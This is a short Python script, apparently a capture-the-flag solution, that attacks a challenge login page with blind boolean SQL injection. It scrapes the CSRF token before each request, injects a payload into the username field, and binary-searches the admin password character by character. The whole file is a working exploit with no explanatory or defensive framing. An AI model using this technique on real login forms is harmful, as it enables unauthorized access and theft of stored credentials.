import requests
import re

URL = 'http://ctf.sharif.edu:35455/chal/hackme/d031e7adbdf8f4b5/login.php'

COOKIE = {"PHPSESSID":"SESSION_HERE",
           "SUCTF_SESSION_ID":"SESSION_HERE"}

p = ''
for i in range(1, 33):
    l = 0
    r = 128
    while l <= r:
        c = (l+r) >> 1
        print('guess - %d' % c)

        response = requests.get(URL, cookies=COOKIE)
        hidden = re.search("name='user_token' value='(.+?)'", response.text).group(1)

        data = {"username":"' or username='admin' and ord(substring(password from %d for 1)) <= %d -- -" % (i, c),
                "password":"",
                "Login":"Login",
                "user_token":hidden}

        response = requests.post(URL, data=data, cookies=COOKIE)
        if 'CSRF' in response.text:
            pass
        elif 'incorrect' in response.text:
            l = c+1
        else:
            r = c-1
    p += chr(l)
    print('%d : %s' % (i, p))
print('final : %s' % p)
